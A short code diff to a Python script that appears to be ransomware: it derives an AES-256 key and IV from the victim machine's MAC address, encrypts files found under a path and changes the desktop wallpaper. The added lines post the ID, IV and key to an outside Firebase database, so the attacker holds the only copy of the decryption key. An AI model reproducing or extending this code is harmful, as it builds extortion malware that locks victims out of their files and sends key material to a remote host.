@@ -3,6 +3,8 @@ import os.path
 import struct
 import hashlib
 import ctypes
+from uuid import getnode as get_mac
+import firebase
 
 IV_SIZE = 16    # 128 bit, fixed for the AES algorithm
 KEY_SIZE = 32   # 256 bit meaning AES-256, can also be 128 or 192 bits
@@ -44,21 +46,27 @@ def search_enc(path):
         pass
 
 def change_bg():
-    dir = ''
     imagePath = 'C:/Users/tmdgh/Desktop/test.jpg'
     SPI_SETDESKWALLPAPER = 20
     ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, imagePath, 3)
 
 testPath = 'C:/Users/tmdgh/Desktop/test123/'
 
-password = 'hwanlee'
+#password = 'hwanlee'
+#password = password.encode()
+#testsalt = b'0912'
+
+mac = get_mac()
+password = str(mac)
 password = password.encode()
 
 salt = os.urandom(SALT_SIZE)
-testsalt = b'0912'
-base = hashlib.pbkdf2_hmac('sha256', password, testsalt, 100000, dklen=IV_SIZE + KEY_SIZE)
+base = hashlib.pbkdf2_hmac('sha256', password, salt, 100000, dklen=IV_SIZE + KEY_SIZE)
 iv = base[0:IV_SIZE]
 key = base[IV_SIZE:]
+
+firebase = firebase.FirebaseApplication('https://keydata-e5fb1.firebaseio.com/', None)
+result = firebase.post('/user',{'ID':str(password),'IV':str(iv),'KEY':str(key)})
 
 change_bg()
 
